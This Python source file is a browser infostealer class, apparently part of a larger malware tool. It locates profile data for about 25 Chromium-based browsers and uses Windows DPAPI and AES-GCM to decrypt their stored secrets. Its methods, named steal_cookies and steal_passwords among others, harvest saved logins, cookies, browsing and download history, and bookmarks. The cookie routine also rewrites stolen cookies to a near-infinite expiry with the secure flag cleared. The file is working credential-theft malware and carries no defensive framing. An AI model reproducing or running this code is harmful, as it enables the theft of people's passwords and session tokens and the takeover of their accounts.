import os, json, base64, sqlite3, shutil

cando = True
if os.name == 'nt':
    import win32crypt
else:
    cando = False
    win32crypt = None

from Crypto.Cipher import AES
from datetime import datetime, timedelta
from pathlib import Path

class Chrome():
    def __init__(self):
        self.sep = '\\' if os.name == 'nt' else '/'
        self.paths = {
            'cookies': f'{self.sep}Default{self.sep}Network{self.sep}Cookies',
            'passwords': f'{self.sep}Default{self.sep}Login Data',
            'history': f'{self.sep}Default{self.sep}History',
            'bookmarks': f'{self.sep}Default{self.sep}Bookmarks',
            'visited': f'{self.sep}Default{self.sep}Visited Links',
            'state': f'{self.sep}Local State'
        }

        self.local = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.config = f'{str(Path.home())}/.config' # linoox
        self.browsers = {
            '7Star': f'{self.local}\\7Star\\7Star\\User Data',
            'Amigo': f'{self.local}\\Amigo\\User Data',
            'Brave': f'{self.roaming}\\brave\\User Data',
            'CentBrowser': f'{self.local}\\CentBrowser\\User Data',
            'Chedot Browser': f'{self.local}\\Chedot\\User Data',
            'Chrome Canary': f'{self.local}\\Google\\Chrome SxS\\User Data',
            'Chromium': f'{self.local}\\Chromium\\User Data',
            'Coccoc': f'{self.local}\\CocCoc\\Browser\\User Data',
            'Elements Browser': f'{self.local}\\Elements Browser\\User Data',
            'Epic Privacy Browser': f'{self.local}\\Epic Privacy Browser\\User Data',
            'Google Chrome': f'{self.local}\\Google\\Chrome\\User Data',
            'Kometa': f'{self.local}\\Kometa\\User Data',
            'Opera':f'{self.roaming}\\Opera Software\\Opera Stable',
            'Orbitum': f'{self.local}\\Orbitum\\User Data',
            'Sputnik': f'{self.local}\\Sputnik\\Sputnik\\User Data',
            'Torch': f'{self.local}\\Torch\\User Data',
            'Uran': f'{self.local}\\uCozMedia\\Uran\\User Data',
            'Vivaldi': f'{self.local}\\Vivaldi\\User Data',
            'YandexBrowser': f'{self.local}\\Yandex\\YandexBrowser\\User Data',
            'Iridium': f'{self.local}\\Iridium\\User Data',
            'Sogou': f'{self.roaming}\\SogouExplorer\\Webkit',
            '360': f'{self.roaming}\\360se6\\User Data',
            '360cse': f'{self.local}\\360Chrome\\Chrome\\User Data',
            '2345': f'{self.local}\\2345Explorer\\User Data',
            'Tencent': f'{self.local}\\Tencent\\QQBrowser\\User Data'
        } if os.name == 'nt' else {
            'Chrome': f'{self.config}/google-chrome',
            'Chromium': f'{self.config}/chromium',
            'Vivaldi': f'{self.config}/vivaldi'
        }

    def get_chrome_datetime(self, chromedate):
        if chromedate != 86400000000 and chromedate:
            try: return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except: return chromedate
        else: return ""

    def get_encryption_key(self, path):
        path += self.paths['state']
        if not os.path.exists(path):
            return

        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_data(self, data, key):
        try:
            cipher = AES.new(key, AES.MODE_GCM, data[3:15])
            return cipher.decrypt(data[15:])[:-16].decode()
        except:
            try: return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except: return ""
        
    def connect(self, path):
        shutil.copyfile(path, 'windump.db')
        db = sqlite3.connect('windump.db')
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()

        return db, cursor
    
    def disconnect(self, db):
        db.commit()
        db.close()

        os.remove('windump.db')
    
    def steal_cookies(self):
        if not cando: return {}

        output = {}
        for browser, path in self.browsers.items():
            try:
                if not os.path.exists(path):
                    continue
                else:
                    cookies = []
                    key = self.get_encryption_key(path)
                    path += self.paths['cookies']
                    if not os.path.exists(path):
                        continue

                    db, cursor = self.connect(path)
                    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.execute('SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies').fetchall():
                        decrypted_value = self.decrypt_data(encrypted_value, key) if not value else value
                        try:
                            cookies.append({
                                'name': name,
                                'url': host_key,
                                'value': decrypted_value,
                                'created_at': f'{self.get_chrome_datetime(creation_utc)}',
                                'last_accessed_at': f'{self.get_chrome_datetime(last_access_utc)}',
                                'expires_at': f'{self.get_chrome_datetime(expires_utc)}'
                            })
                        except: pass

                        # sets cookie expiration date to near infinite
                        try: 
                            cursor.execute("UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?", (decrypted_value, host_key, name))
                            db.commit()
                        except: pass
                    output.update({browser: cookies})
                    self.disconnect(db)
            except: pass
        return output
    
    def steal_passwords(self):
        if not cando: return {}

        output = {}
        for browser, path in self.browsers.items():
            try:
                if not os.path.exists(path):
                    continue
                else:
                    passwords = []
                    key = self.get_encryption_key(path)
                    path += self.paths['passwords']
                    if not os.path.exists(path):
                        continue

                    db, cursor = self.connect(path)
                    for origin_url, action_url, username_value, password_value, date_created, date_last_used in cursor.execute('SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used from logins ORDER BY date_created').fetchall():
                        try:
                            password = self.decrypt_data(password_value, key)

                            passwords.append({
                                'orgigin_url': origin_url,
                                'action_url': action_url,
                                'username': username_value,
                                'password': password,
                                'created_at': f'{self.get_chrome_datetime(date_created)}',
                                'last_used': f'{self.get_chrome_datetime(date_last_used)}'
                            })
                        except: pass
                    output.update({browser: passwords})
                    self.disconnect(db)
            except: pass
        return output
    
    def steal_history(self):
        if not cando: return {}

        output = {}
        for browser, path in self.browsers.items():
            try:
                if not os.path.exists(path):
                    continue
                else:
                    urls, downloads = [], []
                    path += self.paths['history']
                    if not os.path.exists(path):
                        continue

                    db, cursor = self.connect(path)
                    
                    for guid, current_path, target_path, downloaded_at, total_size, filehash, referrer, site_url, tab_url, mime_type, original_mime_type  in cursor.execute('SELECT guid, current_path, target_path, start_time, total_bytes, hash, referrer, site_url, tab_url, mime_type, original_mime_type FROM downloads'):
                        downloads.append({
                            'guid': guid,
                            'current_path': current_path,
                            'target_path': target_path,
                            'downloaded_at': f'{self.get_chrome_datetime(downloaded_at)}',
                            'total_size': total_size,
                            'hash': filehash,
                            'referer': referrer,
                            'site_url': site_url,
                            'tab_url': tab_url,
                            'mime_type': mime_type,
                            'original_mime_type': original_mime_type
                        })
                    
                    for _, url, title, visit_count, typed_count, last_visit_time, hidden in cursor.execute('SELECT * FROM urls').fetchall():
                        urls.append({
                            'url': url,
                            'title': title,
                            'visits': visit_count,
                            'typed': typed_count,
                            'last_visted_at': f'{self.get_chrome_datetime(last_visit_time)}',
                            'hidden': hidden
                        })

                    output.update({browser: {'urls': urls, 'downloads': downloads}})
                    self.disconnect(db)
            except Exception: pass
        return output
    
    def steal_bookmarks(self):
        if not cando: return {}

        output = {}
        for browser, path in self.browsers.items():
            try:
                if not os.path.exists(path):
                    continue
                else:
                    bookmarks = []
                    path += self.paths['bookmarks']
                    if not os.path.exists(path):
                        continue

                    with open(path) as fd:
                        data = json.loads(fd.read())
                    
                    try:
                        for bookmark in data['roots']['bookmark_bar']['children']:
                            bookmarks.append({
                                'name': bookmark['name'],
                                'url': bookmark['url'],
                                'date_added': f'{self.get_chrome_datetime(bookmark["date_added"])}',
                                'guid': bookmark['guid']
                            })
                    except:
                        for bookmark in data['roots']['bookmark_bar']['children'][0]['children']: # Iridium does this, don't know why
                            bookmarks.append({
                                'name': bookmark['name'],
                                'url': bookmark['url'],
                                'date_added': f'{self.get_chrome_datetime(bookmark["date_added"])}',
                                'guid': bookmark['guid']
                            })
                    output.update({browser: {'bookmarks': bookmarks}})
            except Exception: pass
        return output